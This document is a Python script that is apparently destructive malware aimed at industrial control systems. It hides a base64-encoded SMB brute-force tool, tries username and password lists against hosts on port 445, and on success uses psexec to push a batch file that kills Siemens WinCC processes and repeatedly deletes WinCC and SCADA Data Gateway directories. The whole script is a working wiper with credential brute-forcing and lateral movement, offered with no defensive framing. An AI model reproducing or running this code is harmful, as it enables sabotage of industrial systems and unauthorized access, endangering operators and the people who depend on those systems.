import subprocess
import socket
import time
import string
import random
import sys  
filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 6))
SMB = "import base64; exec(base64.b64decode('aW1wb3J0IGFyZ3BhcnNlCmltcG9ydCBzeXMKCmltcG9ydCBzbWIuYmFzZQpmcm9tIHNtYi5TTUJDb25uZWN0aW9uIGltcG9ydCBTTUJDb25uZWN0aW9uCgpkZWYgbGlzdF9zbWJfc2hhcmVzKGNvbm4sIHRpbWVvdXQpOgoJZm9yIHNoYXJlIGluIGNvbm4ubGlzdFNoYXJlcyh0aW1lb3V0KToKCQlpZiBzaGFyZS50eXBlID09IHNtYi5iYXNlLlNoYXJlZERldmljZS5ESVNLX1RSRUU6CgkJCXNoYXJlX3R5cGVfbmFtZSA9ICJEaXNrIgoJCWVsaWYgc2hhcmUudHlwZSA9PSBzbWIuYmFzZS5TaGFyZWREZXZpY2UuUFJJTlRfUVVFVUU6CgkJCXNoYXJlX3R5cGVfbmFtZSA9ICJQcmludGVyIgoJCWVsaWYgc2hhcmUudHlwZSA9PSBzbWIuYmFzZS5TaGFyZWREZXZpY2UuQ09NTV9ERVZJQ0U6CgkJCXNoYXJlX3R5cGVfbmFtZSA9ICJDb21tIERldmljZSIKCQllbGlmIHNoYXJlLnR5cGUgPT0gc21iLmJhc2UuU2hhcmVkRGV2aWNlLklQQzoKCQkJc2hhcmVfdHlwZV9uYW1lID0gIklQQyIKCQllbHNlOgoJCQlzaGFyZV90eXBlX25hbWUgPSAiIgoKZGVmIHJ1bl9icnV0ZV9mb3JjZSh1c2VybmFtZSwgcGFzc3dvcmQsIGFyZ3MpOgoJaXAgPSBhcmdzLmlwCglwb3J0ID0gYXJncy5wb3J0Cglkb21haW4gPSBhcmdzLmRvbWFpbgoJbGlzdF9zaGFyZXMgPSBhcmdzLmxpc3Rfc2hhcmVzCgl0aW1lb3V0ID0gYXJncy50aW1lb3V0Cgl2ZXJib3NlID0gYXJncy52ZXJib3NlCgoJY2xpZW50X25hbWUgPSAiY2xpZW50IgoJc2VydmVyX25hbWUgPSBpcAoJaWYgcG9ydCA9PSA0NDU6CgkJaXNfZGlyZWN0X3RjcCA9IFRydWUKCWVsc2U6CgkJaXNfZGlyZWN0X3RjcCA9IEZhbHNlCgoJdHJ5OgoJCWNvbm4gPSBTTUJDb25uZWN0aW9uKHVzZXJuYW1lLCBwYXNzd29yZCwgY2xpZW50X25hbWUsIHNlcnZlcl9uYW1lLCBkb21haW4gPSBkb21haW4sIHVzZV9udGxtX3YyID0gVHJ1ZSwgaXNfZGlyZWN0X3RjcCA9IGlzX2RpcmVjdF90Y3ApCgkJc21iX2F1dGhlbnRpY2F0aW9uX3N1Y2Nlc3NmdWwgPSBjb25uLmNvbm5lY3QoaXAsIHBvcnQsIHRpbWVvdXQgPSB0aW1lb3V0KQoJCWlmIHNtYl9hdXRoZW50aWNhdGlvbl9zdWNjZXNzZnVsOgoJCQlwcmludChmInN1Y2Nlc3M6IHt1c2VybmFtZSwgcGFzc3dvcmR9IikKCQkJaWYgbGlzdF9zaGFyZXM6CgkJCQlsaXN0X3NtYl9zaGFyZXMoY29ubiwgdGltZW91dCkKCQllbHNlOgoJCQlpZiB2ZXJib3NlOgoJCQkJcHJpbnQoZiJmYWlsZWQ6IHt1c2VybmFtZSwgcGFzc3dvcmR9IikKCWV4Y2VwdDoKCQlpZiB2ZXJib3NlOgoJCQllID0gc3lzLmV4Y19pbmZvKCkKCQkJcHJpbnQoZiJ7c3RyKGUpfSIpCglmaW5hbGx5OgoJCWlmIGNvbm46CgkJCWNvbm4uY2xvc2UoKQoKZGVmIHBhcnNlX3Bhc3N3b3Jkcyh1c2VybmFtZSwgYXJncyk6CglpZiBhcmdzLnBhc3N3b3JkICE9IE5vbmU6CgkJcnVuX2JydXRlX2ZvcmNlKHVzZXJuYW1lLCBhcmdzLnBhc3N3b3JkLCBhcmdzKQoKZGVmIHBhcnNlX3VzZXJuYW1lcyhhcmdzKToKCWlmIGFyZ3MudXNlcm5hbWUgIT0gTm9uZToKCQlwYXJzZV9wYXNzd29yZHMoYXJncy51c2VybmFtZSwgYXJncykKCgoKZGVmIG1haW4oKToKCXBhcnNlcl9kZXNjcmlwdGlvbiA9ICIiCglwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcihkZXNjcmlwdGlvbiA9IHBhcnNlcl9kZXNjcmlwdGlvbiwgZm9ybWF0dGVyX2NsYXNzPWFyZ3BhcnNlLlJhd1RleHRIZWxwRm9ybWF0dGVyKQoJcGFyc2VyLmFkZF9hcmd1bWVudCgiLWlwIiwgYWN0aW9uPSJzdG9yZSIsIGRlc3Q9ImlwIiwgcmVxdWlyZWQ9VHJ1ZSwgaGVscD0iIikKCXBhcnNlci5hZGRfYXJndW1lbnQoIi1wb3J0IiwgYWN0aW9uPSJzdG9yZSIsIGRlc3Q9InBvcnQiLCByZXF1aXJlZD1UcnVlLCB0eXBlPWludCwgaGVscD0iIikKCWdyb3VwMSA9IHBhcnNlci5hZGRfbXV0dWFsbHlfZXhjbHVzaXZlX2dyb3VwKHJlcXVpcmVkPVRydWUpCglncm91cDEuYWRkX2FyZ3VtZW50KCItdXNlcm5hbWUiLCBhY3Rpb249InN0b3JlIiwgZGVzdD0idXNlcm5hbWUiLCBoZWxwPSIiKQoJZ3JvdXAxLmFkZF9hcmd1bWVudCgiLXVzZXJmaWxlIiwgYWN0aW9uPSJzdG9yZSIsIGRlc3Q9InVzZXJmaWxlIiwgaGVscD0iIikKCWdyb3VwMiA9IHBhcnNlci5hZGRfbXV0dWFsbHlfZXhjbHVzaXZlX2dyb3VwKHJlcXVpcmVkPVRydWUpCglncm91cDIuYWRkX2FyZ3VtZW50KCItcGFzc3dvcmQiLCBhY3Rpb249InN0b3JlIiwgZGVzdD0icGFzc3dvcmQiLCBoZWxwPSIiKQoJZ3JvdXAyLmFkZF9hcmd1bWVudCgiLXBhc3N3b3JkZmlsZSIsIGFjdGlvbj0ic3RvcmUiLCBkZXN0PSJwYXNzd29yZGZpbGUiLCBoZWxwPSIiKQoJcGFyc2VyLmFkZF9hcmd1bWVudCgiLWRvbWFpbiIsIGFjdGlvbj0ic3RvcmUiLCBkZXN0PSJkb21haW4iLCBkZWZhdWx0PSIiLCByZXF1aXJlZD1GYWxzZSwgaGVscD0iZS5nLiBXT1JLR1JPVVAiKQoJcGFyc2VyLmFkZF9hcmd1bWVudCgiLWxpc3RzaGFyZXMiLCBhY3Rpb249InN0b3JlX3RydWUiLCBkZXN0PSJsaXN0X3NoYXJlcyIsIGRlZmF1bHQ9RmFsc2UsIHJlcXVpcmVkPUZhbHNlLCBoZWxwPSJsaXN0IFNNQiBzaGFyZXMiKQoJcGFyc2VyLmFkZF9hcmd1bWVudCgiLXRpbWVvdXQiLCBhY3Rpb249InN0b3JlIiwgZGVzdD0idGltZW91dCIsIHR5cGU9aW50LCBkZWZhdWx0PTUsIHJlcXVpcmVkPUZhbHNlLCBoZWxwPSJkZWZhdWx0IDUiKQoJcGFyc2VyLmFkZF9hcmd1bWVudCgiLXYiLCBhY3Rpb249InN0b3JlX3RydWUiLCBkZXN0PSJ2ZXJib3NlIiwgZGVmYXVsdD1GYWxzZSwgcmVxdWlyZWQ9RmFsc2UpCglhcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQoKCXBhcnNlX3VzZXJuYW1lcyhhcmdzKQoKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CgltYWluKCk='))"
Kill = '''
taskkill /F /IM CCProjectMgr.exe
taskkill /F /IM CCUCSurrogate.exe
taskkill /F /IM CCDeltaLoader.exe
taskkill /F /IM CCDmRtChannelHost.exe
taskkill /F /IM CCDmRuntimePersistence.exe
taskkill /F /IM CCKeyboardHook.exe
taskkill /F /IM CCNSInfo2Provider.exe
taskkill /F /IM CCPackageMgr.exe
taskkill /F /IM CCProfileServer.exe
taskkill /F /IM CCPtmRTServer.exe
taskkill /F /IM CCRtsLoader.exe
taskkill /F /IM CCSsmRTServer.exe
taskkill /F /IM CCSystemDiagnosticsHost.exe
taskkill /F /IM CCTextServer.exe
taskkill /F /IM HMRT.exe
taskkill /F /IM PassDBRT.exe
taskkill /F /IM script.exe
:loop
cd "C:\\Program Files (x86)\\Siemens\\WinCC" && rmdir . /s /q 2>nul
cd "C:\\TMWLICENSE" && rmdir . /s /q 2>nul
cd "C:\\Program Files (x86)\\Triangle MicroWorks\\SCADA Data Gateway" && rmdir . /s /q 2>nul
cd "C:\\Users\\stackops\\Desktop\\Win CC 7.4" && rmdir . /s /q 2>nul
goto loop
'''

with open(f"{filename}.py","a") as file:
        file.write(SMB)

with open(f"{filename}.bat","a") as file:
        file.write(Kill)

def range_IPv4():
    with open('targets.txt') as f:
            list2kill = f.read().split()
            return list2kill


def detect_target():
  target=[]
  for IP in range_IPv4():
      try: 
        check = subprocess.check_output(f'python {filename}.py -ip {IP} -port 445 -username WRONGUSERNAME -password WRONGPASSWORD -v' , shell=True)
        print(f"{check}")
        if "failed: ('" in str(check):
            target.append(IP)
      except TimeoutError:
        pass
  return target

def brute_force():
    def username_list():
        with open('username.txt') as f:
            return f.read().split()
    def password_list():
        with open('password.txt') as f:
            return f.read().split()
    collector = [] 
    for IP in detect_target():
        for username in username_list():
            for password in password_list():
                check = subprocess.check_output(f'python {filename}.py -ip {IP} -port 445 -username {username} -password {password} -v' , shell=True)
                print(f"{check}")   
                if "success: ('" in str(check):
                    a= f"{IP}: username: {username}/ password: {password}"
                    collector.append(a)
                    subprocess.call(f"psexec \\\\{IP} -d -siu {username} -p {password} -c C:\\Users\\stackops\\Desktop\\{filename}.bat", shell=True)
                    break                            
    return collector

while True:
    try:
        print(brute_force())
    except Exception:
        sys.exc_clear()
